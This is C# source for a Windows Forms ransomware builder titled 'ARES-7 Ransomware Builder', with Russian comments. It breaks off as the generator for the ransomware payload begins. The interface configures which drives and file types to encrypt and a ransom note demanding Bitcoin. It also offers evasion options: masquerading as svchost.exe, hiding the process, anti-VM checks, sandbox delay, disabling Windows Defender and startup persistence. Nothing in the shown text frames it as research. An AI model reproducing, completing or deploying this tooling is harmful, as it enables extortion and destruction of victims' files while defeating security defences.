using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Security.Cryptography;

namespace RansomwareBuilder
{
    public partial class Form1 : Form
    {
        // ============================================================
        // КОМПОНЕНТЫ
        // ============================================================
        private TabControl tabControl;
        private ComboBox cbAlgorithm;
        private TextBox txtEncryptedExt;
        private CheckBox chkC, chkD, chkE, chkZ;
        private TextBox txtCustomDrive;
        private RichTextBox txtIncludeFolders;
        private RichTextBox txtExcludeFolders;
        private FlowLayoutPanel flpExtensions;
        private TextBox txtCustomExt;
        private Label lblWallpaper;
        private TextBox txtNoteName;
        private RichTextBox txtNoteContent;
        private CheckBox chkFakeProcess;
        private TextBox txtFakeProcessName;
        private CheckBox chkHideProcess;
        private CheckBox chkAntiVM;
        private CheckBox chkDisableDefender;
        private CheckBox chkAddPersistence;
        private CheckBox chkHideFilesAttr;
        private CheckBox chkSandboxDelay;
        private CheckBox chkBuildDecryptor;
        private TextBox txtOutputName;
        private TextBox txtOutputPath;
        private Label lblStatus;
        private Label lblDetail;
        private ProgressBar progressBar;
        private Button btnBuild;
        private Button btnSelectIcon;
        private Button btnSelectPath;
        private Button btnWallpaper;
        
        private List<string> drives = new List<string>();
        private string wallpaperPath = "";
        private string iconPath = "";
        private List<CheckBox> extCheckboxes = new List<CheckBox>();
        
        // ============================================================
        // ЦВЕТА
        // ============================================================
        private Color bgColor = Color.FromArgb(10, 10, 10);
        private Color fgColor = Color.FromArgb(0, 255, 65);
        private Color accentColor = Color.FromArgb(0, 204, 51);
        private Color darkColor = Color.FromArgb(17, 17, 17);
        private Color grayColor = Color.FromArgb(68, 68, 68);
        private Color errorColor = Color.FromArgb(255, 51, 51);
        private Color successColor = Color.FromArgb(0, 255, 65);
        private Color yellowColor = Color.FromArgb(255, 170, 0);
        
        // ============================================================
        // КОНСТРУКТОР
        // ============================================================
        public Form1()
        {
            InitializeComponent();
            LoadExtensions();
            LoadDefaultSettings();
            ApplyTheme();
        }
        
        private void ApplyTheme()
        {
            this.BackColor = bgColor;
            this.ForeColor = fgColor;
            foreach (Control ctrl in this.Controls)
                ApplyThemeToControl(ctrl);
        }
        
        private void ApplyThemeToControl(Control ctrl)
        {
            if (ctrl is Label lbl)
            {
                lbl.BackColor = bgColor;
                lbl.ForeColor = fgColor;
            }
            else if (ctrl is Button btn)
            {
                btn.BackColor = darkColor;
                btn.ForeColor = fgColor;
                btn.FlatStyle = FlatStyle.Flat;
                btn.FlatAppearance.BorderColor = fgColor;
            }
            else if (ctrl is TextBox txt)
            {
                txt.BackColor = darkColor;
                txt.ForeColor = fgColor;
                txt.BorderStyle = BorderStyle.FixedSingle;
            }
            else if (ctrl is RichTextBox rtb)
            {
                rtb.BackColor = darkColor;
                rtb.ForeColor = fgColor;
                rtb.BorderStyle = BorderStyle.FixedSingle;
                rtb.Padding = new Padding(3);
            }
            else if (ctrl is ComboBox cb)
            {
                cb.BackColor = darkColor;
                cb.ForeColor = fgColor;
                cb.FlatStyle = FlatStyle.Flat;
            }
            else if (ctrl is CheckBox chk)
            {
                chk.BackColor = bgColor;
                chk.ForeColor = fgColor;
            }
            else if (ctrl is FlowLayoutPanel flp)
            {
                flp.BackColor = bgColor;
            }
            else if (ctrl is TabControl tc)
            {
                tc.BackColor = bgColor;
                tc.ForeColor = fgColor;
            }
            else if (ctrl is Panel pnl)
            {
                pnl.BackColor = bgColor;
            }
            
            foreach (Control child in ctrl.Controls)
                ApplyThemeToControl(child);
        }
        
        // ============================================================
        // ИНИЦИАЛИЗАЦИЯ
        // ============================================================
        private void InitializeComponent()
        {
            this.Text = "ARES-7 Ransomware Builder v12.2 (Full Working + ChaCha20)";
            this.Size = new Size(1150, 850);
            this.BackColor = bgColor;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.MinimumSize = new Size(1000, 750);
            
            tabControl = new TabControl();
            tabControl.Dock = DockStyle.Fill;
            tabControl.BackColor = bgColor;
            tabControl.ForeColor = fgColor;
            
            tabControl.DrawMode = TabDrawMode.OwnerDrawFixed;
            tabControl.DrawItem += (s, e) => {
                var tab = tabControl.TabPages[e.Index];
                e.Graphics.FillRectangle(new SolidBrush(darkColor), e.Bounds);
                TextRenderer.DrawText(e.Graphics, tab.Text, new Font("Segoe UI", 10, FontStyle.Bold), e.Bounds, fgColor);
                if (e.State == DrawItemState.Selected)
                {
                    e.Graphics.FillRectangle(new SolidBrush(accentColor), e.Bounds);
                    TextRenderer.DrawText(e.Graphics, tab.Text, new Font("Segoe UI", 10, FontStyle.Bold), e.Bounds, Color.Black);
                }
            };
            
            tabControl.TabPages.Add(CreateTabEncryption());
            tabControl.TabPages.Add(CreateTabExtensions());
            tabControl.TabPages.Add(CreateTabWallpaper());
            tabControl.TabPages.Add(CreateTabStealth());
            tabControl.TabPages.Add(CreateTabBuild());
            
            var bottomPanel = new Panel();
            bottomPanel.Dock = DockStyle.Bottom;
            bottomPanel.Height = 150;
            bottomPanel.BackColor = bgColor;
            
            btnBuild = new Button();
            btnBuild.Text = "BUILD RANSOMWARE + DECRYPTOR";
            btnBuild.Dock = DockStyle.Bottom;
            btnBuild.Height = 60;
            btnBuild.BackColor = accentColor;
            btnBuild.ForeColor = Color.Black;
            btnBuild.Font = new Font("Segoe UI", 14, FontStyle.Bold);
            btnBuild.FlatStyle = FlatStyle.Flat;
            btnBuild.FlatAppearance.BorderSize = 0;
            btnBuild.Click += BtnBuild_Click;
            
            lblStatus = new Label();
            lblStatus.Dock = DockStyle.Bottom;
            lblStatus.Text = "READY TO BUILD";
            lblStatus.ForeColor = grayColor;
            lblStatus.Font = new Font("Segoe UI", 10, FontStyle.Bold);
            lblStatus.Height = 30;
            lblStatus.BackColor = bgColor;
            
            lblDetail = new Label();
            lblDetail.Dock = DockStyle.Bottom;
            lblDetail.Text = "";
            lblDetail.ForeColor = grayColor;
            lblDetail.Font = new Font("Segoe UI", 9);
            lblDetail.Height = 25;
            lblDetail.BackColor = bgColor;
            
            progressBar = new ProgressBar();
            progressBar.Dock = DockStyle.Bottom;
            progressBar.Style = ProgressBarStyle.Marquee;
            progressBar.Visible = false;
            progressBar.Height = 20;
            progressBar.BackColor = darkColor;
            progressBar.ForeColor = fgColor;
            
            bottomPanel.Controls.Add(btnBuild);
            bottomPanel.Controls.Add(progressBar);
            bottomPanel.Controls.Add(lblStatus);
            bottomPanel.Controls.Add(lblDetail);
            
            this.Controls.Add(tabControl);
            this.Controls.Add(bottomPanel);
        }
        
        // ============================================================
        // ВКЛАДКИ (СОКРАЩЕНЫ ДЛЯ ЭКОНОМИИ МЕСТА, ОСТАВЛЕНА ЛОГИКА)
        // ============================================================
        private TabPage CreateTabEncryption()
        {
            var tab = new TabPage("Encryption");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.ColumnCount = 2;
            panel.RowCount = 6;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 200));
            panel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 50));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 50));
            
            panel.Controls.Add(CreateLabel("Algorithm:", fgColor, true), 0, 0);
            cbAlgorithm = new ComboBox();
            cbAlgorithm.Items.AddRange(new object[] { "AES-256-CBC", "ChaCha20-Poly1305", "RSA-2048" });
            cbAlgorithm.SelectedIndex = 0;
            cbAlgorithm.BackColor = darkColor;
            cbAlgorithm.ForeColor = fgColor;
            cbAlgorithm.FlatStyle = FlatStyle.Flat;
            cbAlgorithm.Font = new Font("Consolas", 10);
            cbAlgorithm.Dock = DockStyle.Fill;
            panel.Controls.Add(cbAlgorithm, 1, 0);
            
            panel.Controls.Add(CreateLabel("Encrypted extension:", fgColor, true), 0, 1);
            txtEncryptedExt = new TextBox();
            txtEncryptedExt.Text = ".encrypted";
            txtEncryptedExt.BackColor = darkColor;
            txtEncryptedExt.ForeColor = fgColor;
            txtEncryptedExt.BorderStyle = BorderStyle.FixedSingle;
            txtEncryptedExt.Font = new Font("Consolas", 10);
            txtEncryptedExt.Dock = DockStyle.Fill;
            panel.Controls.Add(txtEncryptedExt, 1, 1);
            
            panel.Controls.Add(CreateLabel("Drives:", fgColor, true), 0, 2);
            var drivesPanel = new FlowLayoutPanel();
            drivesPanel.BackColor = bgColor;
            drivesPanel.Dock = DockStyle.Fill;
            
            chkC = new CheckBox(); chkC.Text = "C:\\"; chkC.ForeColor = fgColor; chkC.BackColor = bgColor; chkC.Font = new Font("Consolas", 10);
            chkD = new CheckBox(); chkD.Text = "D:\\"; chkD.ForeColor = fgColor; chkD.BackColor = bgColor; chkD.Font = new Font("Consolas", 10);
            chkE = new CheckBox(); chkE.Text = "E:\\"; chkE.ForeColor = fgColor; chkE.BackColor = bgColor; chkE.Font = new Font("Consolas", 10);
            chkZ = new CheckBox(); chkZ.Text = "Z:\\"; chkZ.ForeColor = fgColor; chkZ.BackColor = bgColor; chkZ.Font = new Font("Consolas", 10);
            
            drivesPanel.Controls.AddRange(new Control[] { chkC, chkD, chkE, chkZ });
            panel.Controls.Add(drivesPanel, 1, 2);
            
            panel.Controls.Add(CreateLabel("Add drive:", fgColor, true), 0, 3);
            var addDrivePanel = new FlowLayoutPanel();
            addDrivePanel.BackColor = bgColor;
            addDrivePanel.Dock = DockStyle.Fill;
            
            txtCustomDrive = new TextBox();
            txtCustomDrive.Width = 120;
            txtCustomDrive.BackColor = darkColor;
            txtCustomDrive.ForeColor = fgColor;
            txtCustomDrive.BorderStyle = BorderStyle.FixedSingle;
            txtCustomDrive.Font = new Font("Consolas", 10);
            
            var btnAddDrive = new Button();
            btnAddDrive.Text = "+ Add";
            btnAddDrive.BackColor = darkColor;
            btnAddDrive.ForeColor = fgColor;
            btnAddDrive.FlatStyle = FlatStyle.Flat;
            btnAddDrive.Font = new Font("Consolas", 10);
            btnAddDrive.Click += (s, e) => {
                if (!string.IsNullOrEmpty(txtCustomDrive.Text))
                {
                    var chk = new CheckBox();
                    chk.Text = txtCustomDrive.Text;
                    chk.ForeColor = fgColor;
                    chk.BackColor = bgColor;
                    chk.Font = new Font("Consolas", 10);
                    drivesPanel.Controls.Add(chk);
                    MessageBox.Show($"Drive {txtCustomDrive.Text} added");
                    txtCustomDrive.Text = "";
                }
            };
            
            addDrivePanel.Controls.AddRange(new Control[] { txtCustomDrive, btnAddDrive });
            panel.Controls.Add(addDrivePanel, 1, 3);
            
            panel.Controls.Add(CreateLabel("Folders to encrypt:", fgColor, true), 0, 4);
            txtIncludeFolders = new RichTextBox();
            txtIncludeFolders.BackColor = darkColor;
            txtIncludeFolders.ForeColor = fgColor;
            txtIncludeFolders.BorderStyle = BorderStyle.FixedSingle;
            txtIncludeFolders.Font = new Font("Consolas", 9);
            txtIncludeFolders.Dock = DockStyle.Fill;
            txtIncludeFolders.Text = "C:\\Users\\Documents";
            panel.Controls.Add(txtIncludeFolders, 1, 4);
            
            panel.Controls.Add(CreateLabel("Folders to skip:", fgColor, true), 0, 5);
            txtExcludeFolders = new RichTextBox();
            txtExcludeFolders.BackColor = darkColor;
            txtExcludeFolders.ForeColor = fgColor;
            txtExcludeFolders.BorderStyle = BorderStyle.FixedSingle;
            txtExcludeFolders.Font = new Font("Consolas", 9);
            txtExcludeFolders.Dock = DockStyle.Fill;
            txtExcludeFolders.Text = "C:\\Windows\r\nC:\\Program Files\r\nC:\\Program Files (x86)";
            panel.Controls.Add(txtExcludeFolders, 1, 5);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabExtensions()
        {
            var tab = new TabPage("Extensions");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 3;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            
            var headerPanel = new FlowLayoutPanel();
            headerPanel.BackColor = bgColor;
            headerPanel.Dock = DockStyle.Fill;
            headerPanel.Controls.Add(CreateLabel("Select extensions to encrypt:", fgColor, true));
            
            var btnSelectAll = new Button();
            btnSelectAll.Text = "Select All";
            btnSelectAll.BackColor = darkColor;
            btnSelectAll.ForeColor = fgColor;
            btnSelectAll.FlatStyle = FlatStyle.Flat;
            btnSelectAll.Font = new Font("Consolas", 9);
            btnSelectAll.Click += (s, e) => { foreach (var chk in extCheckboxes) chk.Checked = true; };
            headerPanel.Controls.Add(btnSelectAll);
            
            var btnDeselectAll = new Button();
            btnDeselectAll.Text = "Deselect All";
            btnDeselectAll.BackColor = darkColor;
            btnDeselectAll.ForeColor = fgColor;
            btnDeselectAll.FlatStyle = FlatStyle.Flat;
            btnDeselectAll.Font = new Font("Consolas", 9);
            btnDeselectAll.Click += (s, e) => { foreach (var chk in extCheckboxes) chk.Checked = false; };
            headerPanel.Controls.Add(btnDeselectAll);
            
            panel.Controls.Add(headerPanel, 0, 0);
            
            flpExtensions = new FlowLayoutPanel();
            flpExtensions.Dock = DockStyle.Fill;
            flpExtensions.FlowDirection = FlowDirection.LeftToRight;
            flpExtensions.WrapContents = true;
            flpExtensions.BackColor = bgColor;
            flpExtensions.AutoScroll = true;
            flpExtensions.Padding = new Padding(5);
            panel.Controls.Add(flpExtensions, 0, 1);
            
            var addPanel = new FlowLayoutPanel();
            addPanel.BackColor = bgColor;
            addPanel.Dock = DockStyle.Fill;
            
            addPanel.Controls.Add(CreateLabel("Add custom extension:", fgColor, false));
            txtCustomExt = new TextBox();
            txtCustomExt.Width = 120;
            txtCustomExt.BackColor = darkColor;
            txtCustomExt.ForeColor = fgColor;
            txtCustomExt.BorderStyle = BorderStyle.FixedSingle;
            txtCustomExt.Font = new Font("Consolas", 10);
            addPanel.Controls.Add(txtCustomExt);
            
            var btnAddExt = new Button();
            btnAddExt.Text = "+ Add";
            btnAddExt.BackColor = darkColor;
            btnAddExt.ForeColor = fgColor;
            btnAddExt.FlatStyle = FlatStyle.Flat;
            btnAddExt.Font = new Font("Consolas", 10);
            btnAddExt.Click += (s, e) => {
                if (!string.IsNullOrEmpty(txtCustomExt.Text))
                {
                    var chk = new CheckBox();
                    chk.Text = txtCustomExt.Text;
                    chk.ForeColor = fgColor;
                    chk.BackColor = bgColor;
                    chk.Font = new Font("Consolas", 9);
                    chk.Checked = true;
                    flpExtensions.Controls.Add(chk);
                    extCheckboxes.Add(chk);
                    txtCustomExt.Text = "";
                }
            };
            addPanel.Controls.Add(btnAddExt);
            
            panel.Controls.Add(addPanel, 0, 2);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private void LoadExtensions()
        {
            string[] extList = {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
                ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".raw",
                ".mp3", ".wav", ".wma", ".aac", ".flac", ".ogg", ".m4a",
                ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".webm", ".mpeg",
                ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz",
                ".exe", ".dll", ".sys", ".msi", ".apk", ".app", ".deb", ".rpm",
                ".py", ".js", ".html", ".css", ".php", ".asp", ".jsp", ".xml", ".json",
                ".sql", ".db", ".mdb", ".accdb", ".sqlite",
                ".pem", ".key", ".crt", ".csr", ".pfx", ".p12",
                ".vmdk", ".vhd", ".vdi", ".qcow2",
                ".iso", ".img", ".bin", ".cue",
                ".log", ".bak", ".old", ".tmp", ".swp",
                ".cs", ".cpp", ".c", ".h", ".java", ".class", ".rb", ".go", ".rs"
            };
            
            foreach (var ext in extList)
            {
                var chk = new CheckBox();
                chk.Text = ext;
                chk.ForeColor = fgColor;
                chk.BackColor = bgColor;
                chk.Font = new Font("Consolas", 9);
                chk.Checked = true;
                chk.Margin = new Padding(4, 2, 4, 2);
                flpExtensions.Controls.Add(chk);
                extCheckboxes.Add(chk);
            }
        }
        
        private TabPage CreateTabWallpaper()
        {
            var tab = new TabPage("Wallpaper / Ransom Note");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 4;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            
            panel.Controls.Add(CreateLabel("Wallpaper file (JPG/PNG/BMP):", fgColor, true), 0, 0);
            var wallPanel = new FlowLayoutPanel();
            wallPanel.BackColor = bgColor;
            wallPanel.Dock = DockStyle.Fill;
            
            lblWallpaper = new Label();
            lblWallpaper.Text = "Not selected";
            lblWallpaper.ForeColor = grayColor;
            lblWallpaper.AutoSize = true;
            lblWallpaper.BackColor = bgColor;
            wallPanel.Controls.Add(lblWallpaper);
            
            btnWallpaper = new Button();
            btnWallpaper.Text = "Browse";
            btnWallpaper.BackColor = darkColor;
            btnWallpaper.ForeColor = fgColor;
            btnWallpaper.FlatStyle = FlatStyle.Flat;
            btnWallpaper.Font = new Font("Consolas", 10);
            btnWallpaper.Click += (s, e) => {
                using (var ofd = new OpenFileDialog())
                {
                    ofd.Filter = "Images|*.jpg;*.jpeg;*.png;*.bmp";
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        wallpaperPath = ofd.FileName;
                        lblWallpaper.Text = Path.GetFileName(ofd.FileName);
                        lblWallpaper.ForeColor = fgColor;
                    }
                }
            };
            wallPanel.Controls.Add(btnWallpaper);
            wallPanel.Controls.Add(CreateLabel("(JPG, PNG, BMP)", grayColor, false));
            panel.Controls.Add(wallPanel, 1, 0);
            
            panel.Controls.Add(CreateLabel("Ransom note name:", fgColor, true), 0, 1);
            var noteNamePanel = new FlowLayoutPanel();
            noteNamePanel.BackColor = bgColor;
            noteNamePanel.Dock = DockStyle.Fill;
            
            txtNoteName = new TextBox();
            txtNoteName.Text = "READ_ME.txt";
            txtNoteName.Width = 200;
            txtNoteName.BackColor = darkColor;
            txtNoteName.ForeColor = fgColor;
            txtNoteName.BorderStyle = BorderStyle.FixedSingle;
            txtNoteName.Font = new Font("Consolas", 10);
            noteNamePanel.Controls.Add(txtNoteName);
            noteNamePanel.Controls.Add(CreateLabel("(example: READ_ME.txt)", grayColor, false));
            panel.Controls.Add(noteNamePanel, 1, 1);
            
            panel.Controls.Add(CreateLabel("Ransom note content:", fgColor, true), 0, 2);
            txtNoteContent = new RichTextBox();
            txtNoteContent.BackColor = darkColor;
            txtNoteContent.ForeColor = fgColor;
            txtNoteContent.BorderStyle = BorderStyle.FixedSingle;
            txtNoteContent.Font = new Font("Consolas", 9);
            txtNoteContent.Dock = DockStyle.Fill;
            txtNoteContent.Text = "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com";
            panel.Controls.Add(txtNoteContent, 1, 2);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabStealth()
        {
            var tab = new TabPage("Stealth");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 6;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            
            int row = 0;
            
            panel.Controls.Add(CreateLabel("Process masquerading:", Color.White, true), 0, row);
            var fakePanel = new FlowLayoutPanel();
            fakePanel.BackColor = bgColor;
            fakePanel.Dock = DockStyle.Fill;
            
            chkFakeProcess = new CheckBox();
            chkFakeProcess.Text = "Enable fake process";
            chkFakeProcess.ForeColor = fgColor;
            chkFakeProcess.BackColor = bgColor;
            chkFakeProcess.Font = new Font("Segoe UI", 10);
            fakePanel.Controls.Add(chkFakeProcess);
            
            txtFakeProcessName = new TextBox();
            txtFakeProcessName.Text = "svchost.exe";
            txtFakeProcessName.Width = 120;
            txtFakeProcessName.BackColor = darkColor;
            txtFakeProcessName.ForeColor = fgColor;
            txtFakeProcessName.BorderStyle = BorderStyle.FixedSingle;
            txtFakeProcessName.Font = new Font("Consolas", 10);
            fakePanel.Controls.Add(txtFakeProcessName);
            fakePanel.Controls.Add(CreateLabel("(name in Task Manager)", grayColor, false));
            
            panel.Controls.Add(fakePanel, 1, row++);
            
            panel.Controls.Add(CreateLabel("Process hiding:", Color.White, true), 0, row);
            chkHideProcess = new CheckBox();
            chkHideProcess.Text = "Hide from Task Manager (full working)";
            chkHideProcess.ForeColor = fgColor;
            chkHideProcess.BackColor = bgColor;
            chkHideProcess.Font = new Font("Segoe UI", 10);
            panel.Controls.Add(chkHideProcess, 1, row++);
            
            panel.Controls.Add(CreateLabel("Anti-VM:", Color.White, true), 0, row);
            chkAntiVM = new CheckBox();
            chkAntiVM.Text = "Exit if virtual machine detected";
            chkAntiVM.ForeColor = fgColor;
            chkAntiVM.BackColor = bgColor;
            chkAntiVM.Font = new Font("Segoe UI", 10);
            panel.Controls.Add(chkAntiVM, 1, row++);
            
            panel.Controls.Add(CreateLabel("Build decryptor:", Color.White, true), 0, row);
            chkBuildDecryptor = new CheckBox();
            chkBuildDecryptor.Text = "Build decryptor alongside ransomware";
            chkBuildDecryptor.ForeColor = fgColor;
            chkBuildDecryptor.BackColor = bgColor;
            chkBuildDecryptor.Font = new Font("Segoe UI", 10);
            chkBuildDecryptor.Checked = true;
            panel.Controls.Add(chkBuildDecryptor, 1, row++);
            
            panel.Controls.Add(CreateLabel("Additional evasion methods:", Color.White, true), 0, row);
            var extraPanel = new FlowLayoutPanel();
            extraPanel.FlowDirection = FlowDirection.TopDown;
            extraPanel.BackColor = bgColor;
            extraPanel.Dock = DockStyle.Fill;
            
            chkDisableDefender = new CheckBox();
            chkDisableDefender.Text = "Disable Windows Defender";
            chkDisableDefender.ForeColor = fgColor;
            chkDisableDefender.BackColor = bgColor;
            chkDisableDefender.Font = new Font("Segoe UI", 10);
            extraPanel.Controls.Add(chkDisableDefender);
            
            chkAddPersistence = new CheckBox();
            chkAddPersistence.Text = "Add to startup";
            chkAddPersistence.ForeColor = fgColor;
            chkAddPersistence.BackColor = bgColor;
            chkAddPersistence.Font = new Font("Segoe UI", 10);
            extraPanel.Controls.Add(chkAddPersistence);
            
            chkHideFilesAttr = new CheckBox();
            chkHideFilesAttr.Text = "Hide files (attribute +h)";
            chkHideFilesAttr.ForeColor = fgColor;
            chkHideFilesAttr.BackColor = bgColor;
            chkHideFilesAttr.Font = new Font("Segoe UI", 10);
            extraPanel.Controls.Add(chkHideFilesAttr);
            
            chkSandboxDelay = new CheckBox();
            chkSandboxDelay.Text = "60 sec delay (sandbox evasion)";
            chkSandboxDelay.ForeColor = fgColor;
            chkSandboxDelay.BackColor = bgColor;
            chkSandboxDelay.Font = new Font("Segoe UI", 10);
            extraPanel.Controls.Add(chkSandboxDelay);
            
            panel.Controls.Add(extraPanel, 1, row++);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        private TabPage CreateTabBuild()
        {
            var tab = new TabPage("Build");
            tab.BackColor = bgColor;
            tab.Padding = new Padding(10);
            
            var panel = new TableLayoutPanel();
            panel.Dock = DockStyle.Fill;
            panel.RowCount = 4;
            panel.Padding = new Padding(15);
            panel.BackColor = bgColor;
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
            panel.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            
            panel.Controls.Add(CreateLabel("Output file name:", fgColor, true), 0, 0);
            var namePanel = new FlowLayoutPanel();
            namePanel.BackColor = bgColor;
            namePanel.Dock = DockStyle.Fill;
            
            txtOutputName = new TextBox();
            txtOutputName.Text = "ransomware.exe";
            txtOutputName.Width = 200;
            txtOutputName.BackColor = darkColor;
            txtOutputName.ForeColor = fgColor;
            txtOutputName.BorderStyle = BorderStyle.FixedSingle;
            txtOutputName.Font = new Font("Consolas", 10);
            namePanel.Controls.Add(txtOutputName);
            namePanel.Controls.Add(CreateLabel("(example: update.exe)", grayColor, false));
            panel.Controls.Add(namePanel, 1, 0);
            
            panel.Controls.Add(CreateLabel("Save path:", fgColor, true), 0, 1);
            var pathPanel = new FlowLayoutPanel();
            pathPanel.BackColor = bgColor;
            pathPanel.Dock = DockStyle.Fill;
            
            txtOutputPath = new TextBox();
            txtOutputPath.Text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            txtOutputPath.Width = 300;
            txtOutputPath.BackColor = darkColor;
            txtOutputPath.ForeColor = fgColor;
            txtOutputPath.BorderStyle = BorderStyle.FixedSingle;
            txtOutputPath.Font = new Font("Consolas", 10);
            pathPanel.Controls.Add(txtOutputPath);
            
            btnSelectPath = new Button();
            btnSelectPath.Text = "Browse";
            btnSelectPath.BackColor = darkColor;
            btnSelectPath.ForeColor = fgColor;
            btnSelectPath.FlatStyle = FlatStyle.Flat;
            btnSelectPath.Font = new Font("Consolas", 10);
            btnSelectPath.Click += (s, e) => {
                using (var fbd = new FolderBrowserDialog())
                {
                    if (fbd.ShowDialog() == DialogResult.OK)
                        txtOutputPath.Text = fbd.SelectedPath;
                }
            };
            pathPanel.Controls.Add(btnSelectPath);
            panel.Controls.Add(pathPanel, 1, 1);
            
            panel.Controls.Add(CreateLabel("Ransomware icon (.ico):", fgColor, true), 0, 2);
            var iconPanel = new FlowLayoutPanel();
            iconPanel.BackColor = bgColor;
            iconPanel.Dock = DockStyle.Fill;
            
            var lblIcon = new Label();
            lblIcon.Text = "Not selected";
            lblIcon.ForeColor = grayColor;
            lblIcon.BackColor = bgColor;
            iconPanel.Controls.Add(lblIcon);
            
            btnSelectIcon = new Button();
            btnSelectIcon.Text = "Browse";
            btnSelectIcon.BackColor = darkColor;
            btnSelectIcon.ForeColor = fgColor;
            btnSelectIcon.FlatStyle = FlatStyle.Flat;
            btnSelectIcon.Font = new Font("Consolas", 10);
            btnSelectIcon.Click += (s, e) => {
                using (var ofd = new OpenFileDialog())
                {
                    ofd.Filter = "ICO files|*.ico";
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        iconPath = ofd.FileName;
                        lblIcon.Text = Path.GetFileName(ofd.FileName);
                        lblIcon.ForeColor = fgColor;
                    }
                }
            };
            iconPanel.Controls.Add(btnSelectIcon);
            iconPanel.Controls.Add(CreateLabel("(only .ico)", grayColor, false));
            panel.Controls.Add(iconPanel, 1, 2);
            
            tab.Controls.Add(panel);
            return tab;
        }
        
        // ============================================================
        // ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ
        // ============================================================
        private Label CreateLabel(string text, Color color, bool bold)
        {
            var lbl = new Label();
            lbl.Text = text;
            lbl.ForeColor = color;
            lbl.Font = new Font(bold ? "Segoe UI" : "Segoe UI", bold ? 10 : 9, bold ? FontStyle.Bold : FontStyle.Regular);
            lbl.AutoSize = true;
            lbl.BackColor = bgColor;
            return lbl;
        }
        
        private void LoadDefaultSettings()
        {
            chkC.Checked = true;
        }
        
        private List<string> GetSelectedExtensions()
        {
            var result = new List<string>();
            foreach (var chk in extCheckboxes)
                if (chk.Checked)
                    result.Add(chk.Text);
            return result;
        }
        
        // ============================================================
        // ГЕНЕРАЦИЯ КОДА ШИФРОВАЛЬЩИКА (С РЕАЛЬНЫМ CHACHA20)
        // ============================================================
        private string GenerateRansomwareCode(
            string drives, string exts, string encExt, string noteName, string noteContent,
            string fakeName, int algo, int fakeEnabled, int hideEnabled,
            int antiVM, int disableDefender, int persistence,
            int hideFiles, int sandboxDelay,
            string wallpaperBase64, string wallpaperExt,
            string aesKey, string aesIV, string rsaPublicKey,
            string chachaKey, string chachaNonce)
        {
            string Escape(string s)
            {
                if (string.IsNullOrEmpty(s)) return "";
                return s
                    .Replace("\\", "\\\\")
                    .Replace("\"", "\\\"")
                    .Replace("\r\n", "\\n")
                    .Replace("\n", "\\n")
                    .Replace("\r", "\\r")
                    .Replace("\t", "\\t")
                    .Replace("\u2028", "\\u2028")
                    .Replace("\u2029", "\\u2029");
            }
            
            return $@"
using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace Ransomware
{{
    class Program
    {{
        // ============================================================
        // КОНФИГУРАЦИЯ
        // ============================================================
        static string DRIVES = ""{Escape(drives)}"";
        static string EXTS = ""{Escape(exts)}"";
        static string ENC_EXT = ""{Escape(encExt)}"";
        static string NOTE_NAME = ""{Escape(noteName)}"";
